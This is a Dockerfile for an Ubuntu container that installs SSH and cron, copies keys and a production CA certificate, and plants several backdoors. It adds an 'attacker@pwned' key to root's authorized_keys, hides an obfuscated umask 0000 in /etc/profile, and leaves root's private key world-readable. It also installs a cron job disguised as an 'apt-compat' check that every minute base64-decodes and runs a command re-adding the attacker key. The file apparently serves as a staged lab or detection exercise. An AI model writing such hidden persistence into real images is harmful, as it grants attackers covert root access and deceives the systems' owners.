FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-client \
    curl \
    cron \
    openssl \
    procps \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY ssh_keys/ /tmp/_k/
COPY ssh_config /tmp/_c
RUN mkdir -p /etc/ssl/trusted
COPY prod-svr/certs/ca.crt /etc/ssl/trusted/prod-root-ca.crt
RUN chmod 0644 /etc/ssl/trusted/prod-root-ca.crt

RUN mkdir -p /root/.ssh \
    && cp /tmp/_k/id_ed25519 /root/.ssh/id_ed25519 \
    && cp /tmp/_k/id_ed25519.pub /root/.ssh/id_ed25519.pub \
    && cp /tmp/_c /root/.ssh/config \
    && chmod 0644 /root/.ssh/id_ed25519 \
    && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO9eratork3yF0rJumpH0st4ccessSREteam00001 operator@ops" > /root/.ssh/authorized_keys \
    && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yX2tleV9mb3JfYXR0YWNrZXIK attacker@pwned" >> /root/.ssh/authorized_keys \
    && rm -rf /tmp/_k /tmp/_c

RUN printf '%s\n' '_m=uma;_m+=sk;eval "${_m} 0000"' >> /etc/profile \
    && printf '%s\n' 'command -v cron >/dev/null && cron 2>/dev/null' >> /etc/bash.bashrc \
    && printf 'SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# apt-compat - package manager compatibility check\n* * * * * root _d=ba;_d+=se;_d+=64;echo "ZWNobyAic3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdKaFkydGtiMjl5WDJ0bGVWOW1iM0pmWVhSMFlXTnJaWElLIGF0dGFja2VyQHB3bmVkIiA+PiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw""o=" | ${_d} -d | sh\n' > /etc/cron.d/apt-compat \
    && chmod 644 /etc/cron.d/apt-compat
